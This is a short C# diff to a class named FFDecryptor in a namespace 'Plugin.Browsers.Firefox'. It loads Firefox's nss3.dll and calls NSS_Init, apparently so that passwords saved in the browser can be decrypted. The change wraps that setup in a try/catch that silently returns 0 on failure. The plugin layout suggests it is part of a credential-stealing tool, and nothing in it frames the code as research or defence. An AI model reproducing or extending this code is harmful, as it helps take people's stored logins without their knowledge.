@@ -16,7 +16,9 @@ namespace Plugin.Browsers.Firefox
         public delegate long DLLFunctionDelegate(string configdir);
         public static long NSS_Init(string configdir)
         {
-            string str;
+            try
+            {
+                string str;
             if (Directory.Exists("C:\\Program Files\\Mozilla Firefox"))
             {
                 str = "C:\\Program Files\\Mozilla Firefox\\";
@@ -32,6 +34,11 @@ namespace Plugin.Browsers.Firefox
             FFDecryptor.LoadLibrary(str + "mozglue.dll");
             FFDecryptor.NSS3 = FFDecryptor.LoadLibrary(str + "nss3.dll");
             return ((FFDecryptor.DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(FFDecryptor.GetProcAddress(FFDecryptor.NSS3, "NSS_Init"), typeof(FFDecryptor.DLLFunctionDelegate)))(configdir);
+            }
+            catch (Exception ex)
+            {
+                return 0;
+            }
         }
 
         public static string Decrypt(string cypherText)
